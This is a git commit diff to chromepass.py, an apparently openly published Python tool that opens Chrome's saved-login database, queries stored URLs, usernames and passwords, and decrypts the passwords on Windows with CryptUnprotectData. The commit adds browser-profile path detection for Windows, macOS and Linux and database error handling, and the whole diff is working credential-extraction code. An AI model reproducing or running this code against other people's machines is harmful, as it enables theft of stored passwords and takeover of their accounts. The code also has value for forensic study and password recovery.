ea5ba24cf148349327d5ff7e9469453f51f4a0f8
Hassaan Ali Wattoo <hassaanaliw@gmail.com>
2015-03-23 20:17:27 +0500

    Add path detection and support for Linux and error catching.

--- chromepass.py
+++ chromepass.py
@@ -17,28 +17,76 @@ def args_parser():
 
 def main():
     info_list = []
-    appdata = getenv("APPDATA")
+    path = getpath()
+    try:
+        connection = sqlite3.connect(path + "Login Data")
+        cursor = connection.cursor()
+        v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
-    if appdata[-7:] == "Roaming":  # Some WINDOWS Installations point to Roaming.
-        appdata = appdata[:-8]
+        value = v.fetchall()
+        for information in value:
+            if os.name == 'nt':
+                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+                if password:
+                    info_list.append({
+                        'origin_url': information[0],
+                        'username': information[1],
+                        'password': str(password)
+                    })
 
-    connection = sqlite3.connect(appdata + "\Local\Google\Chrome\\User Data\Default\Login Data")
-    cursor = connection.cursor()
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+            elif (os.name == "posix") and (sys.platform == "darwin"):
+                return "Mac OSX currently not supported."
 
-    for information in cursor.fetchall():
-        # chrome encrypts the password with Windows WinCrypt.
-        # Fortunately Decrypting it is no big issue.
-        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
-        if password:
-            info_list.append({
-                'origin_url': information[0],
-                'username': information[1],
-                'password': str(password)
-            })
+            elif os.name == 'posix':
+                info_list.append({
+                    'origin_url': information[0],
+                    'username': information[1],
+                    'password': information[2]
+                    })
+        
+        
+        
+        
+    except sqlite3.OperationalError, e:
+            e = str(e)
+            if (e == 'database is locked'):
+                print '[!] Make sure Google Chrome is not running in the background'
+                sys.exit(0)
+            elif (e == 'no such table: cookies'):
+                print '[!] Something wrong with the database name'
+                sys.exit(0)
+            elif (e == 'unable to open database file'):
+                print '[!] Something wrong with the database path'
+                sys.exit(0)
+            else:
+                print e
+                sys.exit(0)
+    
+ 
 
     return info_list
 
+def getpath():
+    if os.name == "nt":
+            # This is the Windows Path
+            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+            if (os.path.isdir(PathName) == False):
+                print '[!] Chrome Doesn\'t exists'
+                sys.exit(0)
+    elif ((os.name == "posix") and (sys.platform == "darwin")):
+            # This is the OS X Path
+            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
+            if (os.path.isdir(PathName) == False):
+                print '[!] Chrome Doesn\'t exists'
+                sys.exit(0)
+    elif (os.name == "posix"):
+            # This is the Linux Path
+            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
+            if (os.path.isdir(PathName) == False):
+                print '[!] Chrome Doesn\'t exists'
+                sys.exit(0)
+    
+    return PathName            
 
 def csv(info):
     csv_file = open('chromepass.csv', 'wb')
